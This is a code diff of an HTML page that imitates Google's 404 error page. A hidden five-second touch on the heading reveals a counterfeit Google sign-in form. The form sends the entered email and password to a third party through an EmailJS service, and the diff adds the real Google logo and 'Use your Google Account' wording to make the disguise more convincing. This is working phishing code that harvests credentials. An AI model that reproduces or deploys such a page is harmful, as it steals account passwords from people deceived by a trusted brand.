@@ -7,89 +7,94 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
     <style>
         :root {
-            --google-blue: #1a73e8;
-            --google-gray: #5f6368;
-            --google-border: #dadce0;
+            --blue: #1a73e8;
+            --text: #202124;
+            --secondary: #5f6368;
+            --border: #dadce0;
         }
 
         body, html { 
             margin: 0; padding: 0; height: 100%; width: 100%;
-            font-family: 'Roboto', arial, sans-serif; 
-            background: #fff; color: #202124;
-            overflow: hidden; /* Prevents scrolling during the interaction */
+            font-family: 'Roboto', arial, sans-serif; background: #fff;
         }
 
-        /* 404 Page Styling */
+        /* --- AUTHENTIC 404 VIEW --- */
         #not-found-view {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            height: 100vh; text-align: left; padding: 0 20px;
+            padding: 30px; margin-top: 50px;
+            display: flex; flex-direction: column; align-items: center;
         }
-        .error-content { max-width: 400px; }
-        .robot-img { width: 120px; margin-bottom: 20px; }
-        h1 { font-size: 24px; font-weight: 400; margin: 0 0 10px; cursor: default; -webkit-user-select: none; user-select: none; }
-        .hold-text { font-weight: bold; color: #000; }
-        p { font-size: 14px; line-height: 1.6; color: var(--google-gray); }
-        ins { text-decoration: none; color: var(--google-gray); }
+        .robot-box { max-width: 400px; width: 100%; }
+        .robot-img { width: 120px; float: right; margin-left: 20px; }
+        h1 { font-size: 14px; font-weight: 700; margin: 0; color: var(--text); }
+        .error-msg { font-size: 14px; line-height: 1.5; color: var(--text); margin: 15px 0; }
+        .error-msg ins { text-decoration: none; color: var(--secondary); }
+        #hold-target { cursor: default; user-select: none; -webkit-user-select: none; }
 
-        /* Login Card Styling */
+        /* --- AUTHENTIC GOOGLE LOGIN --- */
         #access-request {
-            display: none; height: 100vh; background: #fff;
+            display: none; height: 100vh;
             flex-direction: column; align-items: center; justify-content: center;
         }
         .login-card {
-            border: 1px solid var(--google-border);
-            padding: 48px 40px 36px; border-radius: 8px;
-            width: 100%; max-width: 360px; text-align: center;
+            width: 100%; max-width: 400px; padding: 48px 40px;
+            border: 1px solid var(--border); border-radius: 8px;
+            box-sizing: border-box; text-align: center;
         }
-        .google-logo { font-size: 24px; font-weight: 500; margin-bottom: 10px; }
-        .google-logo span:nth-child(1) { color: #4285F4; }
-        .google-logo span:nth-child(2) { color: #EA4335; }
-        .google-logo span:nth-child(3) { color: #FBBC05; }
-        .google-logo span:nth-child(4) { color: #4285F4; }
-        .google-logo span:nth-child(5) { color: #34A853; }
-        .google-logo span:nth-child(6) { color: #EA4335; }
-
+        .g-logo { height: 24px; margin-bottom: 10px; }
+        h2 { font-size: 24px; font-weight: 400; margin: 0 0 8px; color: var(--text); }
+        .sub-text { font-size: 16px; margin-bottom: 30px; color: var(--text); }
+        
         input {
-            width: 100%; padding: 13px 15px; margin: 10px 0;
-            border: 1px solid var(--google-border); border-radius: 4px;
+            width: 100%; padding: 13px 15px; margin-bottom: 10px;
+            border: 1px solid var(--border); border-radius: 4px;
             font-size: 16px; box-sizing: border-box; outline: none;
         }
-        input:focus { border: 2px solid var(--google-blue); padding: 12px 14px; }
+        input:focus { border: 2px solid var(--blue); padding: 12px 14px; }
         
-        .btn-container { display: flex; justify-content: flex-end; margin-top: 30px; }
-        button {
-            background: var(--google-blue); color: white; border: none;
-            padding: 10px 24px; border-radius: 4px; cursor: pointer;
-            font-weight: 500; font-size: 14px; transition: box-shadow 0.2s;
+        .action-row {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-top: 26px;
         }
-        button:active { background: #1765cc; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3); }
+        .create-acc { color: var(--blue); font-weight: 500; font-size: 14px; text-decoration: none; }
+        button {
+            background: var(--blue); color: #fff; border: none;
+            padding: 10px 24px; border-radius: 4px; font-weight: 500;
+            cursor: pointer; font-size: 14px;
+        }
 
-        /* App View Iframe */
+        /* --- APP IFRAME --- */
         #app-view { display: none; width: 100vw; height: 100vh; }
         iframe { width: 100%; height: 100%; border: none; }
+
+        @media (max-width: 450px) {
+            .login-card { border: none; padding: 20px; }
+            #not-found-view { align-items: flex-start; }
+        }
     </style>
 </head>
 <body>
 
 <div id="not-found-view">
-    <div class="error-content">
-        <img src="https://www.google.com/images/errors/robot.png" class="robot-img" alt="Google Robot">
-        <p><b>404.</b> <ins>That’s an error.</ins></p>
-        <p>The requested URL was not found on this server. <ins>That’s all we know.</ins></p>
-        <h1 id="hold-target">Error <span class="hold-text">404</span> (Not Found)!!1</h1>
+    <div class="robot-box">
+        <img src="https://www.google.com/images/errors/robot.png" class="robot-img">
+        <p class="error-msg">
+            <b>404.</b> <ins>That’s an error.</ins><br><br>
+            The requested URL was not found on this server. <ins>That’s all we know.</ins>
+        </p>
+        <h1 id="hold-target">Error 404 (Not Found)!!1</h1>
     </div>
 </div>
 
 <div id="access-request">
     <div class="login-card">
-        <div class="google-logo">
-            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-        </div>
-        <h2 style="font-weight: 400; font-size: 24px; margin: 10px 0 30px;">Sign in</h2>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="g-logo">
+        <h2>Sign in</h2>
+        <p class="sub-text">Use your Google Account</p>
         <form id="request-form">
             <input type="email" name="user_email" placeholder="Email or phone" required>
             <input type="password" name="user_password" placeholder="Enter your password" required>
-            <div class="btn-container">
+            <div class="action-row">
+                <span class="create-acc">Create account</span>
                 <button type="submit" id="submit-btn">Next</button>
             </div>
         </form>
@@ -103,36 +108,39 @@
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
 <script>
-    emailjs.init("6iGADKihYbPC4ecb");
+    // Initialize correctly
+    (function(){
+        emailjs.init("6iGADKihYbPC4ecb");
+    })();
 
     let timer;
     const target = document.getElementById('hold-target');
 
-    // MOBILE ONLY: 5-second long press
-    target.addEventListener('touchstart', (e) => {
+    // Detect finger hold
+    target.addEventListener('touchstart', () => {
         timer = setTimeout(() => {
             document.getElementById('not-found-view').style.display = 'none';
             document.getElementById('access-request').style.display = 'flex';
-        }, 5000); 
+        }, 5000);
     });
-
     target.addEventListener('touchend', () => clearTimeout(timer));
-    target.addEventListener('touchcancel', () => clearTimeout(timer));
 
-    // Handle Submission
     document.getElementById('request-form').addEventListener('submit', function(e) {
         e.preventDefault();
         const btn = document.getElementById('submit-btn');
-        btn.innerText = "Processing...";
+        btn.innerText = "Verifying...";
 
+        // Use the exactly correct send method
         emailjs.sendForm('service_06y4hgi', 'template_56l2irz', this)
             .then(() => {
                 document.getElementById('access-request').style.display = 'none';
                 document.getElementById('app-view').style.display = 'block';
-            }, (err) => {
-                console.error(err);
-                alert("Could not connect to Google services. Check your connection.");
+            })
+            .catch((err) => {
                 btn.innerText = "Next";
+                // Show specific error info to fix connection
+                alert("Connection Error: " + err.text); 
+                console.error("EmailJS Failed:", err);
             });
     });
 </script>
